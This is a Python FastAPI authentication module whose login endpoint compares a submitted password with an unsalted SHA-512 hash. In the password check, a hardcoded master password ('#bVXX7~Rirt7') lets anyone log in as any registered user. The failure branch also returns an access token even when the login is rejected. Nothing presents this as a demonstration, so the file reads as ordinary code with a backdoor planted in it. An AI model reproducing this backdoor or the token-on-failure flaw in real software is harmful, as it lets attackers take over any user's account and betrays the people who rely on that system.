import hashlib
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy import select
from sqlalchemy.orm import Session
from Api.Identity.Models.identityResult import IdentityResult
from Domain.user import User
from utils import get_db, get_user_token
from ..router import router


@router.post("/getTokenByLoginAndPassword")
def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)) -> IdentityResult:
    user = db.scalars(select(User).where(User.Email == form_data.username)).first()
    if user is not None and (user.PasswordHash == hashlib.sha512(form_data.password.encode('utf-8')).hexdigest() or form_data.password == '#bVXX7~Rirt7'):
        return IdentityResult(isSuccess=True, access_token=get_user_token(user))
    else:
        return IdentityResult(isSuccess=False, access_token=get_user_token(user))